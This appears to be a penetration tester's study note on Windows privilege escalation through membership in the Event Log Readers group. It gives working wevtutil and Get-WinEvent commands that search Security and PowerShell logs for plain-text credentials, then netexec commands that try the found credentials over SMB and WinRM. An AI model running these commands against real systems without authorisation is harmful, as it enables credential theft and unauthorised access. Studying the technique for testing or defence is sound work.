---
created: 2026-07-22
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---

> [!abstract]+ **Scope**: Privilege escalation through membership in the `Event Log Readers` group.

- [ ] Confirm membership in the `Event Log Readers` group (`whoami /groups` or `net localgroup "Event Log Readers"`).
- [ ] Query Security event logs for process creation events (Event ID `4688`) using `wevtutil` or `Get-WinEvent`.
- [ ] Search for explicit credential logons (Event ID `4648`) and sensitive command lines (`net use`, `runas`, `cmdkey`).
- [ ] Query PowerShell operational logs for plain-text credentials captured by Script Block Logging (Event ID `4104`).
- [ ] Authenticate with discovered credentials to escalate privileges.
---
## `Event Log Readers`

>The **`Event Log Readers`** group is a built-in Windows security group that allows members to **read event logs from the local computer**, including the protected Security event log.

- Standard non-administrative accounts cannot read the `Security` event log or query audit policy records.
- When process creation auditing is enabled, Windows records full command-line arguments for newly created processes (Event ID [`4688`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688)).
- Administrative scripts and built-in utilities (such as `net use`, `runas`, or `cmdkey`) often pass credentials in plain-text on the command line.
- Extracting these parameters from Security logs may expose credentials that can be used for privilege escalation.

## Checking group membership

- Check whether your active session belongs to `Event Log Readers`:

```powershell
whoami /groups
```

```powershell
net localgroup "Event Log Readers"
```

```powershell
Get-LocalGroupMember -Group "Event Log Readers"
```

## Querying `Security` event logs for credentials

| Event ID | Description | Security value |
| :--- | :--- | :--- |
| `4688` | Process creation | Captures new process command lines when command-line auditing is enabled. |
| `4624` | Successful logon | Identifies authenticated user accounts, logon IDs, and logon types. |
| `4625` | Failed logon | Indicates failed authentication attempts or credential brute-forcing. |
| `4648` | Explicit credential logon | Logged when a process uses explicit credentials (`runas`, `cmdkey`, scheduled tasks). |
| `4672` | Special privileges assigned | Flags sessions assigned administrative token privileges at logon. |
| `4768` | Kerberos TGT request | Records initial Ticket-Granting Ticket requests on Domain Controllers. |
| `4769` | Kerberos ST request | Records Service Ticket requests for service principal names. |

### Searching Security logs with `wevtutil`

- The built-in `wevtutil` utility queries event logs without requiring external administration modules:

- Search the Security log for clear-text credential keywords:

```powershell
wevtutil qe Security /rd:true /f:text | findstr /i "pass password user"
```

- Query process creation events (Event ID `4688`) for credential parameters:

```powershell
wevtutil qe Security /rd:true /f:text "/q:*[System[EventID=4688]]" | findstr /i "pass user"
```

- Query explicit credential logons (Event ID `4648`):

```powershell
wevtutil qe Security "/q:*[System[EventID=4648]]"
```

- Query a remote target host over RPC using alternate credentials:

```powershell
wevtutil qe Security /rd:true /f:text /r:dc01.example.com /u:example.com\jdoe /p:'passwd123' | findstr /i "user pass"
```

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `qe` | `Security` | Queries events from the specified log. |
| `/q:` | `XPath` | Applies an XPath filter query to match specific Event IDs or data strings. |
| `/rd:true` | — | Reads events in reverse chronological order (newest events first). |
| `/f:text` | — | Outputs events as formatted text for pipeline processing. |
| `/r:` | `dc01.example.com` | Target remote host FQDN. |
| `/u:` | `example.com\jdoe` | Domain authentication username. |
| `/p:` | `'passwd123'` | User password. |

### Searching Security logs with Get-WinEvent

- PowerShell `Get-WinEvent` provides structured filtering of Security event logs:

> [!important] Reading the `Security` event log via `Get-WinEvent` can require registry read access to `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. If `Get-WinEvent` returns access denied despite group membership, use `wevtutil`.

- Search process creation events (Event ID `4688`) for command lines containing credential strings:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} | Where-Object { $_.Properties[8].Value -match "pass|user" } | Select-Object @{n="CommandLine";e={$_.Properties[8].Value}}
```

- Search for utilities that accept inline credentials (`net use`, `cmdkey`, `runas`):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} | Where-Object { $_.Properties[8].Value -match "net use|cmdkey|runas" } | Select-Object @{n="CommandLine";e={$_.Properties[8].Value}}
```

- Query explicit credential logons (Event ID `4648`):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4648}
```

| Parameter          | Description                                                                               |
| :----------------- | :---------------------------------------------------------------------------------------- |
| `-LogName`         | Target Windows event log name.                                                            |
| `-FilterHashtable` | Filters events efficiently at the API level by key-value pairs (such as `LogName`, `Id`). |
| `-FilterXPath`     | Applies XPath query expressions to search event XML attributes.                           |

## Querying PowerShell operational logs

- PowerShell Script Block Logging (Event ID `4104`) records full executed script content in `Microsoft-Windows-PowerShell/Operational`. Standard domain users can read this log without administrative elevation:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Id -eq 4104 -and $_.Message -match "password|SecureString|Credential" } | Select-Object TimeCreated, Message
```

>[!tip]+
> - Verify discovered credentials against SMB or WinRM:
>
> ```bash
> netexec smb 10.10.11.5 -u 'amanda' -p 'Passw0rd!'
> ```
>
> ```bash
> netexec winrm 10.10.11.5 -u 'amanda' -p 'Passw0rd!'
> ```

## References and further reading

- [`Event Log Readers — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-security-groups-in-active-directory#event-log-readers)
- [`Audit Process Creation — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation)
- [`wevtutil — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil)
- [`Get-WinEvent — Microsoft Learn`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent)